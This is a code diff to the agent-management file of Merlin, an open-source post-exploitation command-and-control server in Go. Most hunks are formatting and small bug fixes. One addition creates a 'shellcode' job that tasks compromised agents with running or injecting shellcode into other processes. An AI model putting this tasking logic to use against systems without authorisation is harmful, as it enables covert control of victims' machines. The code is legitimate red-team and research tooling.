@@ -1,6 +1,6 @@
 // Merlin is a post-exploitation command and control framework.
 // This file is part of Merlin.
-// Copyright (C) 2018  Russel Van Tuyl
+// Copyright (C) 2019  Russel Van Tuyl
 
 // Merlin is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -19,29 +19,29 @@ package agents
 
 import (
 	// Standard
-	"os"
-	"time"
-	"fmt"
-	"path/filepath"
-	"path"
-	"encoding/json"
-	"io/ioutil"
 	"crypto/sha1"
-	"io"
 	"encoding/base64"
-	"strings"
+	"encoding/json"
 	"errors"
+	"fmt"
+	"io"
+	"io/ioutil"
+	"os"
+	"path"
+	"path/filepath"
 	"strconv"
+	"strings"
+	"time"
 
 	// 3rd Party
-	"github.com/satori/go.uuid"
 	"github.com/fatih/color"
+	"github.com/olekukonko/tablewriter"
+	"github.com/satori/go.uuid"
 
 	// Merlin
-	"github.com/Ne0nd0g/merlin/pkg/messages"
 	"github.com/Ne0nd0g/merlin/pkg/core"
 	"github.com/Ne0nd0g/merlin/pkg/logging"
-	"github.com/olekukonko/tablewriter"
+	"github.com/Ne0nd0g/merlin/pkg/messages"
 )
 
 // Global Variables
@@ -51,47 +51,47 @@ var Agents = make(map[uuid.UUID]*agent)
 var paddingMax = 4096
 
 type agent struct {
-	ID            uuid.UUID
-	Platform      string
-	Architecture  string
-	UserName      string
-	UserGUID      string
-	HostName      string
-	Ips           []string
-	Pid           int
-	agentLog      *os.File
-	channel       chan []Job
-	InitialCheckIn      time.Time
-	StatusCheckIn      time.Time
-	Version       string
-	Build         string
-	WaitTime      string
-	PaddingMax    int
-	MaxRetry      int
-	FailedCheckin int
-	Skew		  int64
-	Proto		  string
+	ID             uuid.UUID
+	Platform       string
+	Architecture   string
+	UserName       string
+	UserGUID       string
+	HostName       string
+	Ips            []string
+	Pid            int
+	agentLog       *os.File
+	channel        chan []Job
+	InitialCheckIn time.Time
+	StatusCheckIn  time.Time
+	Version        string
+	Build          string
+	WaitTime       string
+	PaddingMax     int
+	MaxRetry       int
+	FailedCheckin  int
+	Skew           int64
+	Proto          string
 }
 
 // InitialCheckIn is run on the first communication with an agent and is used to instantiate an agent object
 func InitialCheckIn(j messages.Base) {
-	if core.Debug{
+	if core.Debug {
 		message("debug", "Entering into agents.InitialCheckIn function")
 		message("debug", fmt.Sprintf("Base Message Type: %s", j.Type))
 		message("debug", fmt.Sprintf("Base Message Payload: %s", j.Payload))
-}
+	}
 	message("success", fmt.Sprintf("Received new agent checkin from %s", j.ID))
 
 	// Unmarshal AgentInfo from Base
 	var agentInfo messages.AgentInfo
 	agentInfoPayload, errAgentInfoPayload := json.Marshal(j.Payload)
-	if errAgentInfoPayload != nil{
+	if errAgentInfoPayload != nil {
 		message("warn", fmt.Sprintf("There was an error marshalling the messages.Base Payload: %s",
 			errAgentInfoPayload.Error()))
 		return
 	}
 	errA := json.Unmarshal(agentInfoPayload, &agentInfo)
-	if errA != nil{
+	if errA != nil {
 		message("warn", fmt.Sprintf("There was an error unmarshaling the AgentInfo message: %s", errA.Error()))
 		return
 	}
@@ -99,13 +99,13 @@ func InitialCheckIn(j messages.Base) {
 	// Unmarshal SysInfo from AgentInfo
 	var sysInfo messages.SysInfo
 	sysInfoPayload, errSysInfoPayload := json.Marshal(agentInfo.SysInfo)
-	if errSysInfoPayload != nil{
-		message("warn", fmt.Sprintf("There was an error marshalling the SysInfo Payload of the AgentInfo" +
+	if errSysInfoPayload != nil {
+		message("warn", fmt.Sprintf("There was an error marshalling the SysInfo Payload of the AgentInfo"+
 			" message: %s", errSysInfoPayload.Error()))
 		return
 	}
 	errS := json.Unmarshal(sysInfoPayload, &sysInfo)
-	if errS != nil{
+	if errS != nil {
 		message("warn", fmt.Sprintf("There was an error unmarshaling the SysInfo message: %s",
 			errS.Error()))
 		return
@@ -131,7 +131,7 @@ func InitialCheckIn(j messages.Base) {
 		os.Create(filepath.Join(agentsDir, j.ID.String(), "agent_log.txt"))
 
 		if core.Verbose {
-			message("note",fmt.Sprintf("Created agent log file at: %s agent_log.txt",
+			message("note", fmt.Sprintf("Created agent log file at: %s agent_log.txt",
 				path.Join(agentsDir, j.ID.String())))
 		}
 	}
@@ -142,7 +142,7 @@ func InitialCheckIn(j messages.Base) {
 	}
 	// Add custom agent struct to global agents map
 	Agents[j.ID] = &agent{
-		Version: agentInfo.Version, Build: agentInfo.Build, WaitTime: agentInfo.WaitTime, 
+		Version: agentInfo.Version, Build: agentInfo.Build, WaitTime: agentInfo.WaitTime,
 		PaddingMax: agentInfo.PaddingMax, MaxRetry: agentInfo.MaxRetry, FailedCheckin: agentInfo.FailedCheckin,
 		Skew: agentInfo.Skew, Proto: agentInfo.Proto,
 		ID: j.ID, UserName: sysInfo.UserName, UserGUID: sysInfo.UserGUID, Platform: sysInfo.Platform,
@@ -177,10 +177,10 @@ func StatusCheckIn(j messages.Base) (messages.Base, error) {
 		message("warn", fmt.Sprintf("Orphaned agent %s has checked in. Instructing agent to re-initialize...", j.ID.String()))
 		logging.Server(fmt.Sprintf("[Orphaned agent %s has checked in", j.ID.String()))
 		job := Job{
-			ID: core.RandStringBytesMaskImprSrc(10),
-			Type: "initialize",
+			ID:      core.RandStringBytesMaskImprSrc(10),
+			Type:    "initialize",
 			Created: time.Now(),
-			Status: "created",
+			Status:  "created",
 		}
 		m, mErr := GetMessageForJob(j.ID, job)
 		return m, mErr
@@ -214,8 +214,8 @@ func StatusCheckIn(j messages.Base) (messages.Base, error) {
 		Type:    "ServerOk",
 		Padding: core.RandStringBytesMaskImprSrc(paddingMax),
 	}
-	return m,nil
-	}
+	return m, nil
+}
 
 func marshalMessage(m interface{}) []byte {
 	k, err := json.Marshal(m)
@@ -231,19 +231,19 @@ func UpdateInfo(j messages.Base, p messages.AgentInfo) {
 	_, ok := Agents[j.ID]
 
 	if !ok {
-		message("warn","The agent was not found while processing an AgentInfo message" )
+		message("warn", "The agent was not found while processing an AgentInfo message")
 		return
 	}
 	if core.Debug {
-		message("debug","Processing new agent info")
-		message("debug",fmt.Sprintf("Agent Version: %s", p.Version))
-		message("debug",fmt.Sprintf("Agent Build: %s", p.Build))
-		message("debug",fmt.Sprintf("Agent waitTime: %s", p.WaitTime))
-		message("debug",fmt.Sprintf("Agent skew: %d", p.Skew))
-		message("debug",fmt.Sprintf("Agent paddingMax: %d", p.PaddingMax))
-		message("debug",fmt.Sprintf("Agent maxRetry: %d", p.MaxRetry))
-		message("debug",fmt.Sprintf("Agent failedCheckin: %d", p.FailedCheckin))
-		message("debug",fmt.Sprintf("Agent proto: %s", p.Proto))
+		message("debug", "Processing new agent info")
+		message("debug", fmt.Sprintf("Agent Version: %s", p.Version))
+		message("debug", fmt.Sprintf("Agent Build: %s", p.Build))
+		message("debug", fmt.Sprintf("Agent waitTime: %s", p.WaitTime))
+		message("debug", fmt.Sprintf("Agent skew: %d", p.Skew))
+		message("debug", fmt.Sprintf("Agent paddingMax: %d", p.PaddingMax))
+		message("debug", fmt.Sprintf("Agent maxRetry: %d", p.MaxRetry))
+		message("debug", fmt.Sprintf("Agent failedCheckin: %d", p.FailedCheckin))
+		message("debug", fmt.Sprintf("Agent proto: %s", p.Proto))
 	}
 	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("Processing AgentInfo message:\r\n"))
 	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent Version: %s \r\n", p.Version))
@@ -266,7 +266,7 @@ func UpdateInfo(j messages.Base, p messages.AgentInfo) {
 }
 
 // Log is used to write log messages to the agent's log file
-func Log (agentID uuid.UUID, logMessage string) {
+func Log(agentID uuid.UUID, logMessage string) {
 	Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]%s\r\n", time.Now(), logMessage))
 }
 
@@ -282,7 +282,7 @@ func GetAgentList() func(string) []string {
 }
 
 // ShowInfo lists all of the agent's structure value in a table
-func ShowInfo(agentID uuid.UUID){
+func ShowInfo(agentID uuid.UUID) {
 
 	table := tablewriter.NewWriter(os.Stdout)
 	table.SetAlignment(tablewriter.ALIGN_LEFT)
@@ -315,7 +315,7 @@ func ShowInfo(agentID uuid.UUID){
 }
 
 // message is used to print a message to the command line
-func message (level string, message string) {
+func message(level string, message string) {
 	switch level {
 	case "info":
 		color.Cyan("[i]" + message)
@@ -333,9 +333,9 @@ func message (level string, message string) {
 }
 
 // AddJob creates a job and adds it to the specified agent's channel and returns the Job ID or an error
-func AddJob(agentID uuid.UUID, jobType string, jobArgs []string) (string, error){
+func AddJob(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
 	// TODO turn this into a method of the agent struct
-	if core.Debug{
+	if core.Debug {
 		message("debug", fmt.Sprintf("In agents.AddJob function for agent: %s", agentID.String()))
 		message("debug", fmt.Sprintf("In agents.AddJob function for type: %s", jobType))
 		message("debug", fmt.Sprintf("In agents.AddJob function for command: %s", jobArgs))
@@ -348,22 +348,27 @@ func AddJob(agentID uuid.UUID, jobType string, jobArgs []string) (string, error)
 			isAgent = true
 		}
 	}
-	if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff"{isAgent = true}
+	if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff" {
+		isAgent = true
+	}
 
 	if isAgent {
 		job := Job{
-			Type: jobType,
-			Status: "created",
-			Args: jobArgs,
+			Type:    jobType,
+			Status:  "created",
+			Args:    jobArgs,
 			Created: time.Now(),
 		}
 
-		if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff"{
+		if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff" {
+			if len(Agents) <= 0 {
+				return "", errors.New("there are 0 available agents, no jobs were created")
+			}
 			for k := range Agents {
 				s := Agents[k].channel
 				job.ID = core.RandStringBytesMaskImprSrc(10)
 				s <- []Job{job}
-				Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]Created job Type:%s, ID:%s, Status:%s, " +
+				Agents[k].agentLog.WriteString(fmt.Sprintf("[%s]Created job Type:%s, ID:%s, Status:%s, "+
 					"Args:%s \r\n", time.Now(), job.Type, job.ID, job.Status, job.Args))
 			}
 			return job.ID, nil
@@ -371,7 +376,7 @@ func AddJob(agentID uuid.UUID, jobType string, jobArgs []string) (string, error)
 		job.ID = core.RandStringBytesMaskImprSrc(10)
 		s := Agents[agentID].channel
 		s <- []Job{job}
-		Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]Created job Type:%s, ID:%s, Status:%s, " +
+		Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]Created job Type:%s, ID:%s, Status:%s, "+
 			"Args:%s \r\n", time.Now(), job.Type, job.ID, job.Status, job.Args))
 		return job.ID, nil
 	}
@@ -400,6 +405,25 @@ func GetMessageForJob(agentID uuid.UUID, job Job) (messages.Base, error) {
 		k := marshalMessage(p)
 		m.Type = "CmdPayload"
 		m.Payload = (*json.RawMessage)(&k)
+	case "shellcode":
+		m.Type = "Shellcode"
+		p := messages.Shellcode{
+			Method: job.Args[0],
+			Job:    job.ID,
+		}
+
+		if p.Method == "self" {
+			p.Bytes = job.Args[1]
+		} else if p.Method == "remote" || p.Method == "rtlcreateuserthread" || p.Method == "userapc" {
+			i, err := strconv.Atoi(job.Args[1])
+			if err != nil {
+				return m, err
+			}
+			p.PID = uint32(i)
+			p.Bytes = job.Args[2]
+		}
+		k := marshalMessage(p)
+		m.Payload = (*json.RawMessage)(&k)
 	case "download":
 		m.Type = "FileTransfer"
 		Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]Downloading file from agent at %s\n",
@@ -407,9 +431,9 @@ func GetMessageForJob(agentID uuid.UUID, job Job) (messages.Base, error) {
 			job.Args[0]))
 
 		p := messages.FileTransfer{
-			FileLocation:	job.Args[0],
-			Job:      		job.ID,
-			IsDownload: false,
+			FileLocation: job.Args[0],
+			Job:          job.ID,
+			IsDownload:   false,
 		}
 
 		k := marshalMessage(p)
@@ -432,9 +456,11 @@ func GetMessageForJob(agentID uuid.UUID, job Job) (messages.Base, error) {
 		k := marshalMessage(p)
 		m.Payload = (*json.RawMessage)(&k)
 		err := RemoveAgent(agentID)
-		if err != nil{
-			message("warn",fmt.Sprintf("%s", err.Error()))
-		} else{message("info",fmt.Sprintf("Agent %s was removed from the server", agentID.String()))}
+		if err != nil {
+			message("warn", fmt.Sprintf("%s", err.Error()))
+		} else {
+			message("info", fmt.Sprintf("Agent %s was removed from the server", agentID.String()))
+		}
 	case "maxretry":
 		m.Type = "AgentControl"
 		p := messages.AgentControl{
@@ -494,7 +520,7 @@ func GetMessageForJob(agentID uuid.UUID, job Job) (messages.Base, error) {
 		}
 		fileHash := sha1.New()
 		io.WriteString(fileHash, string(uploadFile))
-		Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]Uploading file from server at %s of size %d" +
+		Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]Uploading file from server at %s of size %d"+
 			" bytes and SHA-1: %x to agent at %s\r\n",
 			time.Now(),
 			job.Args[0],
@@ -521,17 +547,17 @@ func GetMessageForJob(agentID uuid.UUID, job Job) (messages.Base, error) {
 func GetAgentStatus(agentID uuid.UUID) string {
 	var status string
 	dur, errDur := time.ParseDuration(Agents[agentID].WaitTime)
-	if errDur != nil{
+	if errDur != nil {
 		message("warn", fmt.Sprintf("Error converting %s to a time duration: %s", Agents[agentID].WaitTime,
 			errDur.Error()))
 	}
-	if Agents[agentID].StatusCheckIn.Add(dur).After(time.Now()){
+	if Agents[agentID].StatusCheckIn.Add(dur).After(time.Now()) {
 		status = "Active"
-	} else if Agents[agentID].StatusCheckIn.Add(dur * time.Duration(Agents[agentID].MaxRetry + 1)).After(time.Now()){ // +1 to account for skew
+	} else if Agents[agentID].StatusCheckIn.Add(dur * time.Duration(Agents[agentID].MaxRetry+1)).After(time.Now()) { // +1 to account for skew
 		status = "Delayed"
-	} else{
+	} else {
 		status = "Dead"
-		}
+	}
 	return status
 }
 
@@ -552,12 +578,14 @@ func RemoveAgent(agentID uuid.UUID) error {
 	return fmt.Errorf("%s is not a known agent and was not removed", agentID.String())
 
 }
+
 // Job is a structure for holding data for single task assigned to a single agent
 type Job struct {
-	ID		string
-	Type 	string
-	Status 	string		// Valid Statuses are created, sent, returned //TODO this might not be needed
-	Args 	[]string
-	Created	time.Time
+	ID      string
+	Type    string
+	Status  string // Valid Statuses are created, sent, returned //TODO this might not be needed
+	Args    []string
+	Created time.Time
 }
+
 // TODO configure all message to be displayed on the CLI to be returned as errors and not written to the CLI here
